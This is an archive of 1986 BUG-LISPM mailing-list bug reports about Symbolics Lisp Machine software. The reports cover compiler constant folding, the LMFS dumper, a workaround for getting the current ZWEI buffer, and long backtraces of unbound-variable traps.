       (Up until now, I have just been logging out and logging back in)

Not as bad as logging out and logging back in again, but a pretty brutal
way to recover from a broken file connection is 
(send (si:parse-host 'oz) :file-reset)

    Thanks,
    Reid Simmons
20-Feb-86 17:53:03-EST,1340;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 20 Feb 86 17:52-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU 20 Feb 86 17:47:10 EST
Received: from THAMES.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 421413; Thu 20-Feb-86 14:33:01-EST
Date: Thu, 20 Feb 86 14:36 EST
From: Scott McKay <SWM@SCRC-QUABBIN.ARPA>
Subject: the compiler doesn't constant-fold
To: Zvona@OZ.AI.MIT.EDU, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860220121756.1.ZVONA@OTIS.AI.MIT.EDU>
Message-ID: <860220143656.7.SWM@THAMES.SCRC.Symbolics.COM>

    Date: Thu, 20 Feb 86 12:17 EST
    From: David Chapman <Zvona@OZ.AI.MIT.EDU>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
    AISite 13.2, Macsyma 310.35, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
    FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
    FEP0:>V127-INFO.FLOD(2), FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

    (defun foo (x)
      (+ 0 x))

    (disasemble 'foo)
      0  ENTRY: 1 REQUIRED, 0 OPTIONAL
      1  PUSH-IMMED 0
      2  BUILTIN +-INTERNAL STACK FP|0      ;X
      3  RETURN-STACK 

    I wrote a macro that generated (+ 0 ...) a lot.  

    This optimization is pretty elementary...

Optimizers are much more consistent in the development world.  This one
works.

20-Feb-86 19:18:20-EST,1700;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 20 Feb 86 19:18-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 23523; Thu 20-Feb-86 19:20:51-EST
Date: Thu, 20 Feb 86 19:19 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: Couple of comments about the LMFS dumper.
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860220191951.2.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.2, Macsyma 310.35, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
FEP0:>V127-INFO.FLOD(2), FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

1. It would be nice if it dumped the plists of directories. We lost
information stored in plists when we lost one of our disks, and had to
regenerate the plists after the restore. It would have been nicer to
have the plists saved on the dumps.

2. There's no way to override the restorer from deciding not to restore
a file if there's a copy already on the disk. It would be nice to have
as an option to always take the tape copy, and another option, (which
should be the default), which says to take the file with the later
modification date.

3. It would be nice if there were some well-documented way of restoring
the filesystem. The problem with 2. above would not have been so bad if
I knew that the restore program would not restore files that were
already on disk. I would have simply restored from tapes in the reverse
cronological order from which they were written. (last incremental
first, ending with the full save). There was no documentation that told
me that this would be a good idea.
20-Feb-86 23:18:39-EST,3886;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 20 Feb 86 23:18-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 20 FEB 86  21:28:37 EST
Received: from MIT-AI.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 23558; Thu 20-Feb-86 21:29:53-EST
Received: from MORRISON.AI.MIT.EDU by AI.AI.MIT.EDU via Chaosnet; 20 FEB 86  21:14:31 EST
Date: Thu, 20 Feb 86 21:13 EST
From: JCMA@MIT-AI.ARPA
Subject: CURRENT-BUFFER Lossage From Mouse Process
To: BUG-LISPM@MIT-REAGAN.ARPA, bug-lispm@SCRC-STONY-BROOK.ARPA,
    bug-relatus@MIT-AI.ARPA
Message-ID: <860220211344.8.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.2, Macsyma 310.35, Experimental RELATUS 147.7,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

I would appreciate real code for getting the current buffer.  What you find
below is my temporary kludge to get around the problem that the mouse process
can lose track of the value of ZWEI:*INTERVAL* in some cases where the
editor typeout window is exposed.  My problem is that I need to know the
buffer underneath the typeout window but I am not sure how to get it.
the proper way to do this would be greatly appreciated because the kludge below
doesn't work for all cases.  Many thanks.

p.s. a supported CURRENT-BUFFER function would hurt either.

;;; -*- Package: ZWEI; mode: lisp; -*-
;;;------------------------------------------------------------------- 
;;;
;;; GETTING CURRENT BUFFER -- Kludgy For Mouse Process Case
;;;


(DEFUN CURRENT-BUFFER ()
  "Returns the object which is the current buffer, or NIL if there is no current buffer."
  (COND
    ;; normal case when we're in ZMACS
    ((VARIABLE-BOUNDP ZWEI:*INTERVAL*) (SYMEVAL 'ZWEI:*INTERVAL*))
    ;; case of mouse process 
    ;; (it wouldn't hurt to have PROCESS-EQUAL instead of this crufty string comparison.)
    ((STRING-EQUAL (PROCESS-NAME SI:CURRENT-PROCESS) "Mouse")
     (GET-CURRENT-INTERVAL (SELECTED-ZMACS-FRAME)))
    (T NIL)))

(DEFUN SELECTED-ZMACS-FRAME ()
  (COND ((TYPEP TV:SELECTED-WINDOW 'ZWEI:ZMACS-FRAME) TV:SELECTED-WINDOW)
	(T (LOOP FOR W = TV:SELECTED-WINDOW THEN S
		 FOR S = ( W :SUPERIOR)
		 WHEN (TYPEP S 'ZWEI:ZMACS-FRAME)
		   DO (RETURN S)
		 FINALLY (RETURN NIL)))))

(DEFUN INTERVAL-OF-ZMACS-WINDOW-PANE (PANE)
  ( PANE :EVAL-INSIDE-YOURSELF
     `(WINDOW-INTERVAL (SYMEVAL-IN-INSTANCE ',PANE 'ZWEI-WINDOW))))

;; used in current-buffer so that the mouse process will be able to figure out
;; what the current buffer is after the zwei variable bindings *interval* are
;; undone by exiting the process.
(DEFUN GET-CURRENT-INTERVAL (ZMACS-FRAME)
  (LET ((SELECTED-PANE (SYMEVAL-IN-INSTANCE ZMACS-FRAME 'TV:SELECTED-PANE)))
    (SELECTQ (TYPEP SELECTED-PANE)
      (ZMACS-WINDOW-PANE (INTERVAL-OF-ZMACS-WINDOW-PANE SELECTED-PANE))
      (EDITOR-TYPEOUT-WINDOW
       ;; Get the window panes that may hold buffers
       (LET ((P (LOOP FOR W IN ( ZMACS-FRAME :INFERIORS)
		      WHEN (TYPEP W 'ZMACS-WINDOW-PANE)
			COLLECT (INTERVAL-OF-ZMACS-WINDOW-PANE W))))
	 (COND
	   ((NULL P)
	    (RL:BARF "ZMACS-FRAME, ~S, has no ZMACS-WINDOW-PANES." ZMACS-FRAME))
	   ;; only one possible buffer, so win
	   ((NULL (CDR P)) (FIRST P))
	   ;; Try filtering out non-relatus mode buffers
	   (T (SETQ P (LOOP FOR B IN P
			    WHEN (RELATUS-MAJOR-MODE-P B)
			      COLLECT B))
	      (COND
		;; More than one.  Guess
		((CDR P)
		 (TV:NOTIFY TV:SELECTED-WINDOW
			    "~&Underconstrained selected buffer: Choosing ~S from ~S"
			    (FIRST P) P))
		;; only one win
		(T (FIRST P)))))))
      (T (RL:BARF "Selected pane was ~S. Don't know how to get a current buffer for it."
		  SELECTED-PANE)))))
21-Feb-86 12:36:09-EST,6293;000000000000
Received: from MORRISON.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 12:36-EST
Date: Fri, 21 Feb 86 12:38 EST
From: Roger Hurwitz <rhhu@MIT-REAGAN.ARPA>
Subject: >>Trap: The variable ZWEI:*TYPEOUT-WINDOW* is unbound.
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860221123828.6.RHHU@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.2, Macsyma 310.35, Experimental RELATUS 147.8,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

Note that the advertized function, ZWEI:OPEN-EDITOR-STREAM:, was call
from outside ZMACS and that it blow out with this unbound variable
error.

>>Trap: The variable ZWEI:*TYPEOUT-WINDOW* is unbound.
While in the function ZWEI:TYPEOUT-YES-OR-NO-P  ZWEI:FIND-FILE  ZWEI:FIND-FILE

ZWEI:TYPEOUT-YES-OR-NO-P:  (P.C. = 2)
   Rest arg (ZWEI:FORMAT-ARGS): ("Do you want the new version instead? ")

ZWEI:FIND-FILE:  (P.C. = 302)  (from RL: UTILS; RZWEI)
   Arg 0 (ZWEI:PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   Arg 1 (ZWEI:SELECT-P): NIL

ZWEI:FIND-FILE:  (encapsulated for ADVISE)  (from RL: UTILS; RZWEI)
   Rest arg (ARGLIST): (#<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST"> NIL)

ZWEI:FIND-BUFFER-WITH-PATHNAME:  (P.C. = 40)
   Arg 0 (ZWEI:PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   Arg 1 (ZWEI:DEFAULTS): NIL
   Arg 2 (ZWEI:CREATE-P): :WARN
   Arg 3 (ZWEI:LOAD-P): T

ZWEI:FIND-OR-CREATE-BUFFER:  (P.C. = 164)
   Arg 0 (ZWEI:INTERVAL): NIL
   Arg 1 (ZWEI:NAME): NIL
   Arg 2 (ZWEI:PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   Arg 3 (ZWEI:WINDOW): NIL
   Arg 4 (ZWEI:START): :BEGINNING
   Arg 5 (ZWEI:DEFAULTS): NIL
   Arg 6 (ZWEI:CREATE-P): :WARN
   Arg 7 (ZWEI:LOAD-P): T
   Arg 8 (ZWEI:CREATE-OPTIONS): NIL

ZWEI:OPEN-EDITOR-STREAM:  (P.C. = 102)
   Rest arg: (:START :BEGINNING :LOAD-P T :PATHNAME #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">)

MAKE-PATCHES-TO-DICTIONARY-FROM-BUFFER-INTERNAL:  (P.C. = 66)  (from RL: DICTIONARY; PATCHDICT)
   Arg 0 (ACTION): DELETE
   Arg 1 (PATHNAME): "RL:INT;PATCHDELE.LiSP"
   Local 1 (PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   --Defaulted args:--
   Arg 2 (PRINT-WORDS-P): NIL

MAKE-PATCHES-TO-DICTIONARY-FROM-BUFFER:  (P.C. = 10)  (from RL: DICTIONARY; PATCHDICT)
   Arg 0 (ADD-BUFFER): "RL:INT;PATCHADD.LiSP"
   Arg 1 (DEL-BUFFER): "RL:INT;PATCHDELE.LiSP"

PATCH-DICTIONARY-FROM-FILES:  (P.C. = 43)  (from RL: DICTIONARY; PATCHDICT)
   Arg 0 (ADD-PATCH): "RL:INT;PATCHADD.LiSP"
   Arg 1 (DEL-PATCH): "RL:INT;PATCHDELE.LiSP"
   --Defaulted args:--
   Arg 2 (DELETE-P): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (PATCH-DICTIONARY-FROM-FILES "RL:INT;PATCHADD.LiSP" "RL:INT;PATCHDELE.LiSP")
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): NIL
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL

EVAL-WHEN:  (P.C. = 34)
   Arg 0 (SI:.FORM.): (EVAL-WHEN (LOAD EVAL) (LOGIN-SETQ *PRINT-ENTRIES-WHEN-PATCHING-LEXICON* NIL ZWEI:*INSPECT-PARSE-P* NIL ZWEI:*LOAD-FILE-INTO-ZMACS-IF-NON-EXISTENT-BUFFER-ON-PARSE* T *ALWAYS-DISPLAY-LEXICAL-DISAMBIGUATIONS* NIL *SHOW-POSIT-CONSTRAINTS* ...) (PATCH-DICTIONARY-FROM-FILES "RL:INT;PATCHADD.LiSP" "RL:INT;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:IR;PATCHADD.LiSP" "RL:IR;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:EXAMPLES;PATCHADD.LiSP" "RL:EXAMPLES;PATCHDELE.LiSP"))
   Arg 1 (SI:ENV): NIL

SI:*EVAL:  (P.C. = 163)
   Arg 0 (SI:FORM): (EVAL-WHEN (LOAD EVAL) (LOGIN-SETQ *PRINT-ENTRIES-WHEN-PATCHING-LEXICON* NIL ZWEI:*INSPECT-PARSE-P* NIL ZWEI:*LOAD-FILE-INTO-ZMACS-IF-NON-EXISTENT-BUFFER-ON-PARSE* T *ALWAYS-DISPLAY-LEXICAL-DISAMBIGUATIONS* NIL *SHOW-POSIT-CONSTRAINTS* ...) (PATCH-DICTIONARY-FROM-FILES "RL:INT;PATCHADD.LiSP" "RL:INT;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:IR;PATCHADD.LiSP" "RL:IR;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:EXAMPLES;PATCHADD.LiSP" "RL:EXAMPLES;PATCHDELE.LiSP"))
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

SI:READFILE-INTERNAL:  (P.C. = 142)
   Arg 0: #<NFILE-INPUT-CHARACTER-STREAM "B:>rhhu>RELINIT.lisp" 122246753>
   Arg 1 (SI:PKG): NIL
   Arg 2 (SI:NO-MSG-P): NIL
   Rest arg: NIL

FS:LOAD-STREAM:  (P.C. = 16)
   Arg 0 (FS:STREAM): #<NFILE-INPUT-CHARACTER-STREAM "B:>rhhu>RELINIT.lisp" 122246753>
   Arg 1 (FS:PKG): NIL
   Arg 2 (FS:NO-MSG-P): NIL

LOAD:  (P.C. = 124)
   Arg 0 (FS:PATHNAME): #<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">
   Arg 1 (FS:PKG): NIL
   Arg 2 (FS:NONEXISTENT-OK-FLAG): NIL
   Arg 3 (FS:DONT-SET-DEFAULT-P): NIL
   Arg 4 (FS:NO-MSG-P): NIL

(:PROPERTY SI:COM-LOAD-FILE SI:CP-FUNCTION):  (P.C. = 364)
   Arg 0 (SI:FILE-SPEC): (#<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">)
   Arg 1 (COMPILE): :NEVER
   Arg 2 (SI:LOADER): :USE-CANONICAL-TYPE
   Arg 3 (SI:PKG): NIL
   Arg 4 (SI:QUERY): :NO
   Arg 5 (SI:SILENTLY): NIL

SI:COM-LOAD-FILE:  (P.C. = 40)
   Arg 0 (SI:FILE-SPEC): (#<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">)
   Rest arg: NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (SI:COM-LOAD-FILE (QUOTE (#<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">)))
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 114100073>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 114100100>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Lisp Top Level"
   Arg 1 (SI:ABORT-FUNCTION): NIL
   Arg 2 (SI:READ-FUNCTION): NIL
   Arg 3 (SI:EVAL-FUNCTION): NIL
   Arg 4 (SI:PRINT-FUNCTION): NIL

SI:LISP-COMMAND-LOOP:  (P.C. = 67)
   Arg 0: #<LISP-LISTENER Lisp Listener 4 16511667 exposed>
   Rest arg: (:NAME "Lisp Top Level")

SI:LISP-TOP-LEVEL1:  (P.C. = 5)
   Arg 0 (SI:STREAM): #<LISP-LISTENER Lisp Listener 4 16511667 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
21-Feb-86 12:41:13-EST,7247;000000000000
Received: from MORRISON.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 12:40-EST
Date: Fri, 21 Feb 86 12:43 EST
From: Roger Hurwitz <rhhu@MIT-REAGAN.ARPA>
Subject: >>Trap: The variable ZWEI:*MAJOR-MODE* is unbound.
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860221124314.7.RHHU@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.2, Macsyma 310.35, Experimental RELATUS 147.8,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

More lossage with ZWEI:OPEN-EDITOR-STREAM: use outside of ZMACS.

>>Trap: The variable ZWEI:*MAJOR-MODE* is unbound.
While in the function ZWEI:SET-MAJOR-MODE  ZWEI:SET-ATTRIBUTE-STATE-FROM-BUFFER  ZWEI:SET-ATTRIBUTE-STATE-FROM-BUFFER

ZWEI:SET-MAJOR-MODE:  (P.C. = 1)
   Arg 0 (ZWEI:MODE): #<LISP-MODE 145014240>

ZWEI:SET-ATTRIBUTE-STATE-FROM-BUFFER:  (P.C. = 14)  (from RL: LMLIB; FONTX)
   Arg 0 (ZWEI:BUFFER): #<FILE-BUFFER "patchdele.lisp >relatus>examples>intervention B:" 13300050>

ZWEI:SET-ATTRIBUTE-STATE-FROM-BUFFER:  (encapsulated for ADVISE)  (from RL: LMLIB; FONTX)
   Rest arg (ARGLIST): (#<FILE-BUFFER "patchdele.lisp >relatus>examples>intervention B:" 13300050>)

(:DEFUN-METHOD ZWEI:REVERT-FROM-STREAM):  (P.C. = 71)
   Arg 0 (SELF): #<FILE-BUFFER "patchdele.lisp >relatus>examples>intervention B:" 13300050>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:FILE-BUFFER-MIXIN -- 9. IV's, 0. FL's 170424075>
   Arg 2 (ZWEI:STREAM): #<NFILE-INPUT-CHARACTER-STREAM "B:>relatus>examples>intervention>patchdele.lisp" 122543437>

(:METHOD ZWEI:FILE-BUFFER-MIXIN :REVERT):  (P.C. = 114)
   Arg 0 (SELF): #<FILE-BUFFER "patchdele.lisp >relatus>examples>intervention B:" 13300050>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:FILE-BUFFER-MIXIN -- 9. IV's, 0. FL's 170424075>
   Arg 2 (SI:OPERATION): :REVERT

ZWEI:FIND-FILE:  (P.C. = 310)  (from RL: UTILS; RZWEI)
   Arg 0 (ZWEI:PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   Arg 1 (ZWEI:SELECT-P): NIL

ZWEI:FIND-FILE:  (encapsulated for ADVISE)  (from RL: UTILS; RZWEI)
   Rest arg (ARGLIST): (#<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST"> NIL)

ZWEI:FIND-BUFFER-WITH-PATHNAME:  (P.C. = 40)
   Arg 0 (ZWEI:PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   Arg 1 (ZWEI:DEFAULTS): NIL
   Arg 2 (ZWEI:CREATE-P): :WARN
   Arg 3 (ZWEI:LOAD-P): T

ZWEI:FIND-OR-CREATE-BUFFER:  (P.C. = 164)
   Arg 0 (ZWEI:INTERVAL): NIL
   Arg 1 (ZWEI:NAME): NIL
   Arg 2 (ZWEI:PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   Arg 3 (ZWEI:WINDOW): NIL
   Arg 4 (ZWEI:START): :BEGINNING
   Arg 5 (ZWEI:DEFAULTS): NIL
   Arg 6 (ZWEI:CREATE-P): :WARN
   Arg 7 (ZWEI:LOAD-P): T
   Arg 8 (ZWEI:CREATE-OPTIONS): NIL

ZWEI:OPEN-EDITOR-STREAM:  (P.C. = 102)
   Rest arg: (:START :BEGINNING :LOAD-P T :PATHNAME #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">)

MAKE-PATCHES-TO-DICTIONARY-FROM-BUFFER-INTERNAL:  (P.C. = 66)  (from RL: DICTIONARY; PATCHDICT)
   Arg 0 (ACTION): DELETE
   Arg 1 (PATHNAME): "RL:INT;PATCHDELE.LiSP"
   Local 1 (PATHNAME): #<LOGICAL-PATHNAME "RL: INT; PATCHDELE.LISP.NEWEST">
   --Defaulted args:--
   Arg 2 (PRINT-WORDS-P): NIL

MAKE-PATCHES-TO-DICTIONARY-FROM-BUFFER:  (P.C. = 10)  (from RL: DICTIONARY; PATCHDICT)
   Arg 0 (ADD-BUFFER): "RL:INT;PATCHADD.LiSP"
   Arg 1 (DEL-BUFFER): "RL:INT;PATCHDELE.LiSP"

PATCH-DICTIONARY-FROM-FILES:  (P.C. = 43)  (from RL: DICTIONARY; PATCHDICT)
   Arg 0 (ADD-PATCH): "RL:INT;PATCHADD.LiSP"
   Arg 1 (DEL-PATCH): "RL:INT;PATCHDELE.LiSP"
   --Defaulted args:--
   Arg 2 (DELETE-P): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (PATCH-DICTIONARY-FROM-FILES "RL:INT;PATCHADD.LiSP" "RL:INT;PATCHDELE.LiSP")
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): NIL
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL

EVAL-WHEN:  (P.C. = 34)
   Arg 0 (SI:.FORM.): (EVAL-WHEN (LOAD EVAL) (LOGIN-SETQ *PRINT-ENTRIES-WHEN-PATCHING-LEXICON* NIL ZWEI:*INSPECT-PARSE-P* NIL ZWEI:*LOAD-FILE-INTO-ZMACS-IF-NON-EXISTENT-BUFFER-ON-PARSE* T *ALWAYS-DISPLAY-LEXICAL-DISAMBIGUATIONS* NIL *SHOW-POSIT-CONSTRAINTS* ...) (PATCH-DICTIONARY-FROM-FILES "RL:INT;PATCHADD.LiSP" "RL:INT;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:IR;PATCHADD.LiSP" "RL:IR;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:EXAMPLES;PATCHADD.LiSP" "RL:EXAMPLES;PATCHDELE.LiSP"))
   Arg 1 (SI:ENV): NIL

SI:*EVAL:  (P.C. = 163)
   Arg 0 (SI:FORM): (EVAL-WHEN (LOAD EVAL) (LOGIN-SETQ *PRINT-ENTRIES-WHEN-PATCHING-LEXICON* NIL ZWEI:*INSPECT-PARSE-P* NIL ZWEI:*LOAD-FILE-INTO-ZMACS-IF-NON-EXISTENT-BUFFER-ON-PARSE* T *ALWAYS-DISPLAY-LEXICAL-DISAMBIGUATIONS* NIL *SHOW-POSIT-CONSTRAINTS* ...) (PATCH-DICTIONARY-FROM-FILES "RL:INT;PATCHADD.LiSP" "RL:INT;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:IR;PATCHADD.LiSP" "RL:IR;PATCHDELE.LiSP") (PATCH-DICTIONARY-FROM-FILES "RL:EXAMPLES;PATCHADD.LiSP" "RL:EXAMPLES;PATCHDELE.LiSP"))
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

SI:READFILE-INTERNAL:  (P.C. = 142)
   Arg 0: #<NFILE-INPUT-CHARACTER-STREAM "B:>rhhu>RELINIT.lisp" 103414774>
   Arg 1 (SI:PKG): NIL
   Arg 2 (SI:NO-MSG-P): NIL
   Rest arg: NIL

FS:LOAD-STREAM:  (P.C. = 16)
   Arg 0 (FS:STREAM): #<NFILE-INPUT-CHARACTER-STREAM "B:>rhhu>RELINIT.lisp" 103414774>
   Arg 1 (FS:PKG): NIL
   Arg 2 (FS:NO-MSG-P): NIL

LOAD:  (P.C. = 124)
   Arg 0 (FS:PATHNAME): #<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">
   Arg 1 (FS:PKG): NIL
   Arg 2 (FS:NONEXISTENT-OK-FLAG): NIL
   Arg 3 (FS:DONT-SET-DEFAULT-P): NIL
   Arg 4 (FS:NO-MSG-P): NIL

(:PROPERTY SI:COM-LOAD-FILE SI:CP-FUNCTION):  (P.C. = 364)
   Arg 0 (SI:FILE-SPEC): (#<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">)
   Arg 1 (COMPILE): :NEVER
   Arg 2 (SI:LOADER): :USE-CANONICAL-TYPE
   Arg 3 (SI:PKG): NIL
   Arg 4 (SI:QUERY): :NO
   Arg 5 (SI:SILENTLY): NIL

SI:COM-LOAD-FILE:  (P.C. = 40)
   Arg 0 (SI:FILE-SPEC): (#<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">)
   Rest arg: NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (SI:COM-LOAD-FILE (QUOTE (#<LMFS-PATHNAME "B:>rhhu>RELINIT.lisp">)))
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 114100073>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 114100100>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Lisp Top Level"
   Arg 1 (SI:ABORT-FUNCTION): NIL
   Arg 2 (SI:READ-FUNCTION): NIL
   Arg 3 (SI:EVAL-FUNCTION): NIL
   Arg 4 (SI:PRINT-FUNCTION): NIL

SI:LISP-COMMAND-LOOP:  (P.C. = 67)
   Arg 0: #<LISP-LISTENER Lisp Listener 4 16511667 exposed>
   Rest arg: (:NAME "Lisp Top Level")

SI:LISP-TOP-LEVEL1:  (P.C. = 5)
   Arg 0 (SI:STREAM): #<LISP-LISTENER Lisp Listener 4 16511667 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
21-Feb-86 12:42:10-EST,7203;000000000000
Received: from MORRISON.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 12:42-EST
Date: Fri, 21 Feb 86 12:44 EST
From: Roger Hurwitz <rhhu@MIT-REAGAN.ARPA>
Subject: >>Trap: The variable ZWEI:*WINDOW* is unbound.
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860221124429.8.RHHU@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.2, Macsyma 310.35, Experimental RELATUS 147.8,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

Same reason ZWEI:OPEN-EDITOR-STREAM:

>>Trap: The variable ZWEI:*WINDOW* is unbound.
While in the function ZWEI:SET-ATTRIBUTE-STATE-FROM-BUFFER  ZWEI:SET-ATTRIBUTE-STATE-FROM-BUFFER  (:DEFUN-METHOD ZWEI:REVERT-FROM-STREAM)

ZWEI:SET-ATTRIBUTE-STATE-FROM-BUFFER:  (P.C. = 14)  (from RL: LMLIB; FONTX)
   Arg 0 (ZWEI:BUFFER): #<FILE-BUFFER "patchdele.lisp >relatus>examples>intervention B:" 13300050>
   Local 1 (ZWEI:MAJOR-MODE): #<LISP-MODE 145014240>

ZWEI:SET-ATTRIBUTE-STATE-FROM-BUFFER:  (encapsulated for ADVISE)  (from RL: LMLIB; FONTX)
   Rest arg (ARGLIST): (#<FILE-BUFFER "patchdele.lisp >relatus>examples>intervention B:" 13300050>)

(:DEFUN-METHOD ZWEI:REVERT-FROM-STREAM):  (P.C. = 71)
   Arg 0 (SELF): #<FILE-BUFFER "patchdele.lisp >relatus>examples>intervention B:" 13300050>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:FILE-BUFFER-MIXIN -- 9. IV's, 0. FL's 170424075>
